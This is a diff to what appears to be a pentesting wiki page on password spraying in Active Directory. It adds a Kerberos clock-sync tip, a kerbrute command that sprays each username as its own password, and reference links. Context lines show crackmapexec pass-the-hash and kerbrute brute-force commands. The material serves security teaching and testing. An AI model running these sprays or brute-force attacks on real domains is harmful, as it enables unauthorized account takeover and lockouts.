@@ -53,6 +53,23 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
 
+#### Kerberos time sync and fast "user:user" spray
+
+Kerberos is time sensitive. If your host clock differs from the KDC beyond the allowed skew, you will see failures like KRB_AP_ERR_SKEW and miss valid hits. Always sync time before Kerberos-based spraying:
+
+```bash
+# Linux
+sudo ntpdate <dc_ip> || sudo chronyc -a makestep
+# Windows
+w32tm /resync /nowait
+```
+
+A quick low-noise check that often finds weak accounts is a username=password spray. Example with kerbrute:
+
+```bash
+./kerbrute_linux_amd64 passwordspray -d EXAMPLE.LOCAL --dc dc01.example.local users.txt {user}
+```
+
 - [**spray**](https://github.com/Greenwolf/Spray) _**(you can indicate number of attempts to avoid lockouts):**_
 
 ```bash
@@ -226,6 +243,8 @@ To use any of these tools, you need a user list and a password / a small list of
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [MIT Kerberos – clockskew](https://web.mit.edu/kerberos/krb5-latest/doc/admin/conf_files/krb5_conf.html#clockskew)
+- [HTB: Sweep — Lansweeper credential interception and AD ACL abuse to Domain Admin](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
